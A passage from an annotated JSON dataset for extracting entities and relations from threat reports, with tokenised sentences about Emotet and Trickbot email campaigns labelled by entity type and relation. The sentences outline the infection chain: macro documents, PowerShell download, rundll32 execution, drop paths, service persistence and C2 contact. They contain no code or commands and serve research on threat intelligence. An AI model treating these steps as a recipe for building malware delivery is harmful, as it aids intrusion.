2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [18, 18], "name": "attached file", "pos": [5, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "downloader", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "Emotet payload", "pos": [15, 17], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [31, 31], "name": "Emotet", "pos": [0, 1], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [36, 36], "name": "DOCM", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [38, 38], "name": "XLSM", "pos": [7, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [41, 41], "name": "password-protected ZIP", "pos": [10, 12], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "spam campaigns", "pos": [15, 17], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [57, 57], "name": "XLSM files", "pos": [8, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "malspam campaigns", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [68, 68], "name": "documents", "pos": [1, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [70, 70], "name": "OLE2 macros", "pos": [3, 5], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [76, 76], "name": "WScript", "pos": [3, 4], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [81, 81], "name": "PowerShell", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [88, 88], "name": "Emotet DLL", "pos": [15, 17], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [92, 92], "name": "distribution servers", "pos": [19, 21], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [96, 96], "name": "macros", "pos": [1, 2], "index": "19_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [106, 106], "name": "PowerShell", "pos": [11, 12], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [114, 114], "name": "DLL", "pos": [1, 2], "index": "21_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [119, 119], "name": "rundll32.exe", "pos": [6, 7], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [126, 126], "name": "Emotet", "pos": [13, 14], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "h": 6, "t": 8}, {"r": "WR", "evidence": [2], "h": 6, "t": 9}, {"r": "RD", "evidence": [2], "t": 9, "h": 10}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 11}, {"r": "CO", "evidence": [2, 3], "h": 10, "t": 12}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "CO", "evidence": [4, 5, 6], "h": 14, "t": 19}, {"r": "FR", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "ST", "evidence": [5], "h": 16, "t": 18}, {"r": "RF", "evidence": [5], "h": 16, "t": 18}, {"r": "CO", "evidence": [5, 6, 7], "h": 17, "t": 21}, {"r": "RD", "evidence": [5, 6], "t": 17, "h": 20}, {"r": "EX", "evidence": [5, 6], "t": 17, "h": 20}, {"r": "WR", "evidence": [6, 7], "h": 20, "t": 21}, {"r": "EX", "evidence": [7], "t": 21, "h": 22}, {"r": "FR", "evidence": [7], "h": 22, "t": 23}]}, {"title": "037-3", "sents": [["These", "emails", "typically", "contain", "an", "attached", "file", "that", "functions", "as", "a", "downloader", "to", "retrieve", "the", "Emotet", "payload", "."], ["Emotet", "has", "been", "observed", "leveraging", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "archives", "across", "these", "spam", "campaigns", "."], ["Below", "is", "an", "example", "of", "one", "of", "the", "XLSM", "files", "observed", "being", "delivered", "in", "these", "malspam", "campaigns", "."], ["These", "documents", "contain", "OLE2", "macros", "."], ["When", "executed", ",", "WScript", "is", "used", "to", "invoke", "PowerShell", "which", "is", "used", "to", "retrieve", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "macros", "are", "obfuscated", ",", "but", "the", "screenshot", "below", "shows", "the", "PowerShell", "invocation", "once", "deobfuscated", "at", "runtime", "."], ["The", "DLL", "is", "then", "executed", "via", "rundll32.exe", ",", "thus", "infecting", "the", "system", "with", "Emotet", "."], ["After", "rundll32.exe", "execution", ",", "the", "DLL", "is", "saved", "in", "``", "C", ":", "\\\\ProgramData\\\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64\\", "<", "RANDOM", "FILENAME", ">", ".", "''"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "emails", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "attached file", "pos": [5, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "downloader", "pos": [11, 12], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "Emotet payload", "pos": [15, 17], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "Emotet", "pos": [0, 1], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "DOCM", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "XLSM", "pos": [7, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "password-protected ZIP", "pos": [10, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "spam campaigns", "pos": [15, 17], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "XLSM files", "pos": [8, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "malspam campaigns", "pos": [15, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [55, 55], "name": "documents", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [57, 57], "name": "OLE2 macros", "pos": [3, 5], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [63, 63], "name": "WScript", "pos": [3, 4], "index": "13_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [68, 68], "name": "PowerShell", "pos": [8, 9], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [75, 75], "name": "Emotet DLL", "pos": [15, 17], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [79, 79], "name": "distribution servers", "pos": [19, 21], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [83, 83], "name": "macros", "pos": [1, 2], "index": "17_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [93, 93], "name": "PowerShell", "pos": [11, 12], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [101, 101], "name": "DLL", "pos": [1, 2], "index": "19_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [106, 106], "name": "rundll32.exe", "pos": [6, 7], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [113, 113], "name": "Emotet", "pos": [13, 14], "index": "21_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [116, 116], "name": "rundll32.exe", "pos": [1, 2], "index": "22_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [125, 125], "name": "C : \\\\ProgramData\\\\ < RANDOM FILENAME >", "pos": [10, 17], "index": "23_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [135, 135], "name": "C : \\Windows\\SysWOW64\\ < RANDOM FILENAME", "pos": [20, 26], "index": "24_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "EX", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "WR", "evidence": [1], "h": 4, "t": 7}, {"r": "RD", "evidence": [1], "t": 7, "h": 8}, {"r": "CO", "evidence": [1, 2], "h": 6, "t": 9}, {"r": "CO", "evidence": [1, 2], "h": 8, "t": 10}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "CO", "evidence": [3, 4, 5], "h": 12, "t": 17}, {"r": "FR", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "ST", "evidence": [4], "h": 14, "t": 16}, {"r": "RF", "evidence": [4], "h": 14, "t": 16}, {"r": "CO", "evidence": [4, 5, 6], "h": 15, "t": 19}, {"r": "RD", "evidence": [4, 5], "t": 15, "h": 18}, {"r": "EX", "evidence": [4, 5], "t": 15, "h": 18}, {"r": "WR", "evidence": [5, 6], "h": 18, "t": 19}, {"r": "EX", "evidence": [6], "t": 19, "h": 20}, {"r": "FR", "evidence": [6], "h": 20, "t": 21}, {"r": "RD", "evidence": [6, 7], "h": 21, "t": 23}, {"r": "RD", "evidence": [6, 7], "h": 21, "t": 23}, {"r": "WR", "evidence": [6, 7], "h": 21, "t": 23}, {"r": "RD", "evidence": [6, 7], "h": 20, "t": 24}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "RD", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 22, "t": 24}]}, {"title": "037-4", "sents": [["Emotet", "has", "been", "observed", "leveraging", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "archives", "across", "these", "spam", "campaigns", "."], ["Below", "is", "an", "example", "of", "one", "of", "the", "XLSM", "files", "observed", "being", "delivered", "in", "these", "malspam", "campaigns", "."], ["These", "documents", "contain", "OLE2", "macros", "."], ["When", "executed", ",", "WScript", "is", "used", "to", "invoke", "PowerShell", "which", "is", "used", "to", "retrieve", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "macros", "are", "obfuscated", ",", "but", "the", "screenshot", "below", "shows", "the", "PowerShell", "invocation", "once", "deobfuscated", "at", "runtime", "."], ["The", "DLL", "is", "then", "executed", "via", "rundll32.exe", ",", "thus", "infecting", "the", "system", "with", "Emotet", "."], ["After", "rundll32.exe", "execution", ",", "the", "DLL", "is", "saved", "in", "``", "C", ":", "\\\\ProgramData\\\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64\\", "<", "RANDOM", "FILENAME", ">", ".", "''"], ["Persistence", "is", "achieved", "by", "registering", "a", "Windows", "Service", "that", "is", "set", "to", "execute", "the", "malware", "following", "system", "reboots", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Emotet", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "DOCM", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "XLSM", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "password-protected ZIP", "pos": [10, 12], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "spam campaigns", "pos": [15, 17], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "XLSM files", "pos": [8, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "malspam campaigns", "pos": [15, 17], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "documents", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [39, 39], "name": "OLE2 macros", "pos": [3, 5], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [45, 45], "name": "WScript", "pos": [3, 4], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [50, 50], "name": "PowerShell", "pos": [8, 9], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [57, 57], "name": "Emotet DLL", "pos": [15, 17], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [61, 61], "name": "distribution servers", "pos": [19, 21], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [65, 65], "name": "macros", "pos": [1, 2], "index": "13_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [75, 75], "name": "PowerShell", "pos": [11, 12], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [83, 83], "name": "DLL", "pos": [1, 2], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [88, 88], "name": "rundll32.exe", "pos": [6, 7], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [95, 95], "name": "Emotet", "pos": [13, 14], "index": "17_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [98, 98], "name": "rundll32.exe", "pos": [1, 2], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [107, 107], "name": "C : \\\\ProgramData\\\\ < RANDOM FILENAME >", "pos": [10, 17], "index": "19_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [117, 117], "name": "C : \\Windows\\SysWOW64\\ < RANDOM FILENAME", "pos": [20, 26], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [132, 132], "name": "Windows Service", "pos": [6, 8], "index": "21_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 4, "t": 6}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 8, "t": 13}, {"r": "FR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 12}, {"r": "RF", "evidence": [3], "h": 10, "t": 12}, {"r": "CO", "evidence": [3, 4, 5], "h": 11, "t": 15}, {"r": "RD", "evidence": [3, 4], "t": 11, "h": 14}, {"r": "EX", "evidence": [3, 4], "t": 11, "h": 14}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 15}, {"r": "EX", "evidence": [5], "t": 15, "h": 16}, {"r": "FR", "evidence": [5], "h": 16, "t": 17}, {"r": "RD", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "RD", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "RD", "evidence": [5, 6], "h": 16, "t": 20}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 18}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 20}, {"r": "RD", "evidence": [6, 7], "t": 20, "h": 21}, {"r": "RD", "evidence": [6, 7], "t": 20, "h": 21}, {"r": "WR", "evidence": [6, 7], "t": 20, "h": 21}]}, {"title": "037-5", "sents": [["Below", "is", "an", "example", "of", "one", "of", "the", "XLSM", "files", "observed", "being", "delivered", "in", "these", "malspam", "campaigns", "."], ["These", "documents", "contain", "OLE2", "macros", "."], ["When", "executed", ",", "WScript", "is", "used", "to", "invoke", "PowerShell", "which", "is", "used", "to", "retrieve", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "macros", "are", "obfuscated", ",", "but", "the", "screenshot", "below", "shows", "the", "PowerShell", "invocation", "once", "deobfuscated", "at", "runtime", "."], ["The", "DLL", "is", "then", "executed", "via", "rundll32.exe", ",", "thus", "infecting", "the", "system", "with", "Emotet", "."], ["After", "rundll32.exe", "execution", ",", "the", "DLL", "is", "saved", "in", "``", "C", ":", "\\\\ProgramData\\\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64\\", "<", "RANDOM", "FILENAME", ">", ".", "''"], ["Persistence", "is", "achieved", "by", "registering", "a", "Windows", "Service", "that", "is", "set", "to", "execute", "the", "malware", "following", "system", "reboots", "."], ["The", "infected", "system", "establishes", "a", "C2", "communications", "channel", "and", "begins", "receiving", "instructions", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "XLSM files", "pos": [8, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "malspam campaigns", "pos": [15, 17], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "documents", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "OLE2 macros", "pos": [3, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [27, 27], "name": "WScript", "pos": [3, 4], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [32, 32], "name": "PowerShell", "pos": [8, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [39, 39], "name": "Emotet DLL", "pos": [15, 17], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [43, 43], "name": "distribution servers", "pos": [19, 21], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [47, 47], "name": "macros", "pos": [1, 2], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [57, 57], "name": "PowerShell", "pos": [11, 12], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [65, 65], "name": "DLL", "pos": [1, 2], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [70, 70], "name": "rundll32.exe", "pos": [6, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [77, 77], "name": "Emotet", "pos": [13, 14], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [80, 80], "name": "rundll32.exe", "pos": [1, 2], "index": "13_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [89, 89], "name": "C : \\\\ProgramData\\\\ < RANDOM FILENAME >", "pos": [10, 17], "index": "14_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [99, 99], "name": "C : \\Windows\\SysWOW64\\ < RANDOM FILENAME", "pos": [20, 26], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [114, 114], "name": "Windows Service", "pos": [6, 8], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [128, 128], "name": "infected system", "pos": [1, 3], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [132, 132], "name": "C2", "pos": [5, 6], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 8}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "ST", "evidence": [2], "h": 5, "t": 7}, {"r": "RF", "evidence": [2], "h": 5, "t": 7}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 10}, {"r": "RD", "evidence": [2, 3], "t": 6, "h": 9}, {"r": "EX", "evidence": [2, 3], "t": 6, "h": 9}, {"r": "WR", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "t": 10, "h": 11}, {"r": "FR", "evidence": [4], "h": 11, "t": 12}, {"r": "RD", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "RD", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "WR", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "RD", "evidence": [4, 5], "h": 11, "t": 15}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "RD", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5], "h": 13, "t": 15}, {"r": "RD", "evidence": [5, 6], "t": 15, "h": 16}, {"r": "RD", "evidence": [5, 6], "t": 15, "h": 16}, {"r": "WR", "evidence": [5, 6], "t": 15, "h": 16}, {"r": "ST", "evidence": [6, 7], "h": 16, "t": 18}, {"r": "RF", "evidence": [6, 7], "h": 16, "t": 18}, {"r": "ST", "evidence": [7], "h": 17, "t": 18}, {"r": "RF", "evidence": [7], "h": 17, "t": 18}, {"r": "RD", "evidence": [5, 6, 7], "t": 15, "h": 17}]}, {"title": "037-6", "sents": [["These", "documents", "contain", "OLE2", "macros", "."], ["When", "executed", ",", "WScript", "is", "used", "to", "invoke", "PowerShell", "which", "is", "used", "to", "retrieve", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "macros", "are", "obfuscated", ",", "but", "the", "screenshot", "below", "shows", "the", "PowerShell", "invocation", "once", "deobfuscated", "at", "runtime", "."], ["The", "DLL", "is", "then", "executed", "via", "rundll32.exe", ",", "thus", "infecting", "the", "system", "with", "Emotet", "."], ["After", "rundll32.exe", "execution", ",", "the", "DLL", "is", "saved", "in", "``", "C", ":", "\\\\ProgramData\\\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64\\", "<", "RANDOM", "FILENAME", ">", ".", "''"], ["Persistence", "is", "achieved", "by", "registering", "a", "Windows", "Service", "that", "is", "set", "to", "execute", "the", "malware", "following", "system", "reboots", "."], ["The", "infected", "system", "establishes", "a", "C2", "communications", "channel", "and", "begins", "receiving", "instructions", "."], ["These", "systems", "can", "then", "be", "leveraged", "for", "additional", "spam", "distribution", ",", "allowing", "an", "attacker", "to", "further", "increase", "the", "scope", "of", "their", "distribution", "campaigns", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "documents", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "OLE2 macros", "pos": [3, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [9, 9], "name": "WScript", "pos": [3, 4], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [14, 14], "name": "PowerShell", "pos": [8, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "Emotet DLL", "pos": [15, 17], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [25, 25], "name": "distribution servers", "pos": [19, 21], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [29, 29], "name": "macros", "pos": [1, 2], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [39, 39], "name": "PowerShell", "pos": [11, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [47, 47], "name": "DLL", "pos": [1, 2], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [52, 52], "name": "rundll32.exe", "pos": [6, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [59, 59], "name": "Emotet", "pos": [13, 14], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [62, 62], "name": "rundll32.exe", "pos": [1, 2], "index": "11_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [71, 71], "name": "C : \\\\ProgramData\\\\ < RANDOM FILENAME >", "pos": [10, 17], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [81, 81], "name": "C : \\Windows\\SysWOW64\\ < RANDOM FILENAME", "pos": [20, 26], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [96, 96], "name": "Windows Service", "pos": [6, 8], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [110, 110], "name": "infected system", "pos": [1, 3], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [114, 114], "name": "C2", "pos": [5, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [123, 123], "name": "systems", "pos": [1, 2], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [130, 130], "name": "spam distribution", "pos": [8, 10], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 6}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 8}, {"r": "RD", "evidence": [1, 2], "t": 4, "h": 7}, {"r": "EX", "evidence": [1, 2], "t": 4, "h": 7}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "t": 8, "h": 9}, {"r": "FR", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "RD", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "WR", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "RD", "evidence": [3, 4], "h": 9, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "RD", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4], "h": 11, "t": 13}, {"r": "RD", "evidence": [4, 5], "t": 13, "h": 14}, {"r": "RD", "evidence": [4, 5], "t": 13, "h": 14}, {"r": "WR", "evidence": [4, 5], "t": 13, "h": 14}, {"r": "ST", "evidence": [5, 6], "h": 14, "t": 16}, {"r": "RF", "evidence": [5, 6], "h": 14, "t": 16}, {"r": "ST", "evidence": [6], "h": 15, "t": 16}, {"r": "RF", "evidence": [6], "h": 15, "t": 16}, {"r": "RD", "evidence": [4, 5, 6], "t": 13, "h": 15}, {"r": "CO", "evidence": [6, 7], "h": 15, "t": 17}, {"r": "FR", "evidence": [7], "t": 17, "h": 18}]}, {"title": "038-0", "sents": [["We", "have", "noticed", "that", "a", "number", "of", "Trickbot", "C2", "servers", "have", "issued", "certain", "commands", "to", "Trickbot", "infections", "that", "are", "linked", "to", "different", "gtags", "."], ["As", "a", "result", ",", "we", "have", "seen", "new", "malicious", "email", "campaigns", "emerging", ",", "directly", "delivering", "Emotet", "to", "targeted", "victims", "."], ["Email", "thread", "hijacking", "is", "one", "popular", "technique", "employed", "in", "the", "delivery", "of", "these", "emails", ",", "which", "usually", "contain", "an", "attachment", "functioning", "as", "a", "downloader", "for", "obtaining", "the", "Emotet", "payload", "."], ["Emotet", "has", "been", "utilizing", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "archives", "in", "these", "spam", "campaigns", "."], ["One", "example", "of", "XLSM", "file", "involved", "in", "this", "malspam", "campaign", "has", "been", "identified", ",", "which", "contains", "OLE2", "macros", "."], ["WScript", "is", "utilized", "to", "invoke", "PowerShell", "once", "the", "macros", "are", "executed", ",", "which", "then", "retrieves", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "PowerShell", "invocation", "can", "be", "seen", "in", "the", "screenshot", "below", ",", "which", "is", "often", "obfuscated", "at", "runtime", "."], ["Once", "rundll32.exe", "executes", ",", "the", "DLL", "is", "saved", "in", "``", "C", ":", "\\ProgramData\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64", "<", "RANDOM", "FILENAME", ">", ",", "''", "thereby", "infecting", "the", "system", "with", "Emotet", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [7, 7], "name": "Trickbot C2 servers", "pos": [7, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "Trickbot", "pos": [15, 16], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "malicious email", "pos": [8, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "Emotet", "pos": [15, 16], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [42, 42], "name": "victims", "pos": [18, 19], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "Email thread hijacking", "pos": [0, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "emails", "pos": [13, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "attachment", "pos": [19, 20], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "downloader", "pos": [23, 24], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [71, 71], "name": "Emotet payload", "pos": [27, 29], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [74, 74], "name": "Emotet", "pos": [0, 1], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "DOCM", "pos": [4, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [80, 80], "name": "XLSM", "pos": [6, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [83, 83], "name": "password-protected ZIP archives", "pos": [9, 12], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "spam campaigns", "pos": [14, 16], "index": "14_0"}], [{"type": 